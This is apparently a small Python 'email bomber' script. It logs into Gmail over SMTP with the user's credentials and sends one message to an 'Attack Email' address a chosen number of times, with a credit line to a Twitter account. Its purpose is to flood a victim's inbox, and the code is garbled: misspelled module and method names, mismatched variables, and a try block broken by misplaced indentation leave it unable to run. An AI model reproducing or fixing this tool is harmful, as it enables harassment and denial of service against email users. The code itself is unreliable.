import os
import sys
import getpass
import smtplib

email = input("Email here")
pswd = getpass.getpass("Password here")
vemail = input("Attack Email here")
message = ("Message here")
count = input("Amount of times")
print()

try:
    smtp.server='smtp.gmail.com'
    port = 587
    server = smtlib.SMTP(smtp_server,port)
    server.ehlo()
    server.staartls()
    server.login(email,pswd)
    print("[*] Sending in progress... \n")
i = 0
while i < count:
    i+= 1
    server.sendmail(email.vemail,message)
    if i == 1:
        print("[+] %dst Email has been sent " %(i))
    elif i == 2:
        print("[+] %dnd Email has been sent " %(i))
    elif i == 3:
        print("[+] %drd Email has been sent " %(i))
    else:
        print("[+] %dst Email has been sent " %(i))
    sys.stdout.flish()
    print("[+] All Done")

# Credits go to twitter.com/wwebpy

except KeyboardInterrupt:
    print()
    print("[x] Canceled")
    sys.exit()
except smtlib.SMTPAuthenticationError:
    print()
    print("[x] the Username and Password is Incorrect ")
    print("[x] Error X contact Dev ")
    sys.exit()
    
    
    
